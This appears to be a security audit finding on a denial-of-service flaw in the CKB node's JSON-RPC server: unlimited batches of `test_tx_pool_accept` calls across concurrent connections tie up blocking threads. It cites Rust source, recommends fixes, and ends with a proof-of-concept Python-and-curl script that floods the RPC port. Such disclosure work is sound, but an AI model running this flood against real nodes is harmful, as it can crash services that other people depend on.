Audit Report

## Title
No Rate Limiting Combined with Disabled Batch Limit Enables CPU Exhaustion via Concurrent `test_tx_pool_accept` Batch Requests — (File: `rpc/src/server.rs`, `tx-pool/src/process.rs`)

## Summary
The CKB JSON-RPC server applies no per-connection or per-IP rate limiting, and the batch request size cap (`rpc_batch_limit`) is disabled by default. The `test_tx_pool_accept` RPC method runs full CKB-VM script verification via `block_in_place`, blocking a Tokio OS thread for the duration of each call. An attacker can send many concurrent HTTP connections each carrying an unbounded batch of `test_tx_pool_accept` calls, exhausting the Tokio blocking thread pool and rendering the node unresponsive.

## Finding Description

**1. No rate limiting on the RPC server.**
`start_server` in `rpc/src/server.rs` builds the Axum router with only `CorsLayer::permissive()` and a 30-second `TimeoutLayer`. There is no connection limit, no per-IP throttle, and no concurrency-limiting middleware. [1](#0-0) 

**2. Batch size limit is off by default.**
`JSONRPC_BATCH_LIMIT` is only populated when `config.rpc_batch_limit` is explicitly set. The default `resource/ckb.toml` ships with the option commented out, and the comment itself acknowledges the risk. When unset, the guard at lines 275–282 is never entered. [2](#0-1) [3](#0-2) [4](#0-3) 

**3. Batch calls are processed sequentially, but multiple concurrent connections multiply the effect.**
The batch handler uses `stream::iter(calls).then(...)`, which is sequential — a single batch does not spawn N concurrent verifications. However, the 30-second `TimeoutLayer` is the only bound per connection. An attacker opening K concurrent HTTP connections each carrying a large batch saturates K Tokio blocking threads simultaneously for up to 30 seconds each, and can immediately reconnect after timeout. [5](#0-4) 

**4. `test_tx_pool_accept` runs full CKB-VM verification via `block_in_place`.**
`_test_accept_tx` calls `verify_rtx` with `self.consensus.max_block_cycles()` (consensus default ~3.5 billion cycles) and passes `None` for `command_rx`. This routes execution into the `block_in_place` branch, blocking an OS thread for the full verification duration. [6](#0-5) [7](#0-6) 

**5. `PoolIsFull` rejection does not apply.**
`test_tx_pool_accept` is a dry-run path that does not insert into the pool, so the pool-full guard that limits `send_transaction` flooding is irrelevant here. [8](#0-7) 

## Impact Explanation
By opening many concurrent connections and sending large batches of `test_tx_pool_accept` calls, an attacker saturates all Tokio blocking threads. The tx-pool service queue backs up, P2P sync and block submission stall, and the node becomes unresponsive. This matches the allowed impact: **High — Vulnerabilities which could easily crash a CKB node** (10001–15000 points).

## Likelihood Explanation
The RPC server defaults to `127.0.0.1:8114`, requiring local access or an exposed RPC port. Many operators expose the RPC port to internal networks or behind reverse proxies without authentication. The `rpc_batch_limit` guard is off by default. The attack requires only standard HTTP POST requests with a crafted JSON body — no special privileges, tokens, or keys. It is repeatable and requires no victim interaction.

## Recommendation

1. **Enable `rpc_batch_limit` by default** in `resource/ckb.toml` (e.g., `rpc_batch_limit = 200`) rather than leaving it commented out.
2. **Add a concurrency-limiting middleware** (e.g., `tower::limit::ConcurrencyLimitLayer`) to the Axum router in `rpc/src/server.rs` `start_server`, keyed by source IP or globally, to cap simultaneous in-flight requests.
3. **Add a connection limit** to the TCP accept loop in `start_tcp_server` (`rpc/src/server.rs` lines 176–194), which currently spawns an unbounded number of tasks.
4. **Cap cycles for `test_tx_pool_accept`** at `max_tx_verify_cycles` (from tx-pool config, currently 70M) rather than `max_block_cycles` (~3.5B) in `_test_accept_tx`, consistent with how regular submission is bounded.

## Proof of Concept

```bash
# Open 50 concurrent connections, each sending a batch of 500 test_tx_pool_accept calls
python3 -c "
import json
call = {
  'jsonrpc': '2.0', 'method': 'test_tx_pool_accept', 'id': 1,
  'params': [{'version':'0x0','cell_deps':[],'header_deps':[],
              'inputs':[{'previous_output':{'tx_hash':'0x'+'a'*64,'index':'0x0'},'since':'0x0'}],
              'outputs':[],'outputs_data':[],'witnesses':[]}, None]
}
print(json.dumps([call]*500))
" > batch.json

# Launch 50 concurrent curl processes
for i in $(seq 1 50); do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    -d @batch.json &
done
wait
# Each of the 50 connections enters the sequential batch handler;
# each call hits _test_accept_tx -> verify_rtx -> block_in_place(ContextualTransactionVerifier)
# with max_block_cycles, saturating Tokio blocking threads and stalling the node.
```

### Citations

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L274-282)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }
```

**File:** rpc/src/server.rs (L284-296)
```rust
                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** tx-pool/src/process.rs (L779-800)
```rust
    pub(crate) async fn _test_accept_tx(&self, tx: TransactionView) -> Result<Completed, Reject> {
        let (pre_check_ret, snapshot) = self.pre_check(&tx).await;

        let (_tip_hash, rtx, status, _fee, _tx_size) = pre_check_ret?;

        // skip check the delay window

        let verify_cache = self.fetch_tx_verify_cache(&tx).await;
        let max_cycles = self.consensus.max_block_cycles();
        let tip_header = snapshot.tip_header();
        let tx_env = Arc::new(status.with_env(tip_header));

        verify_rtx(
            Arc::clone(&snapshot),
            Arc::clone(&rtx),
            tx_env,
            &verify_cache,
            max_cycles,
            None,
        )
        .await
    }
```

**File:** tx-pool/src/util.rs (L116-131)
```rust
    } else {
        block_in_place(|| {
            ContextualTransactionVerifier::new(Arc::clone(&rtx), consensus, data_loader, tx_env)
                .verify(max_tx_verify_cycles, false)
                .and_then(|result| {
                    DaoScriptSizeVerifier::new(
                        rtx,
                        snapshot.cloned_consensus(),
                        snapshot.as_data_loader(),
                    )
                    .verify()?;
                    Ok(result)
                })
                .map_err(Reject::Verification)
        })
    }
```

**File:** rpc/src/module/pool.rs (L637-660)
```rust
    fn test_tx_pool_accept(
        &self,
        tx: Transaction,
        outputs_validator: Option<OutputsValidator>,
    ) -> Result<EntryCompleted> {
        let tx: packed::Transaction = tx.into();
        let tx: core::TransactionView = tx.into_view();

        self.check_output_validator(outputs_validator, &tx)?;

        let tx_pool = self.shared.tx_pool_controller();

        let test_accept_tx_reslt = tx_pool.test_accept_tx(tx).map_err(|e| {
            error!("Send test_tx_pool_accept_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })?;

        test_accept_tx_reslt
            .map(|test_accept_result| test_accept_result.into())
            .map_err(|reject| {
                error!("Send test_tx_pool_accept_tx request error {}", reject);
                RPCError::from_submit_transaction_reject(&reject)
            })
    }
```
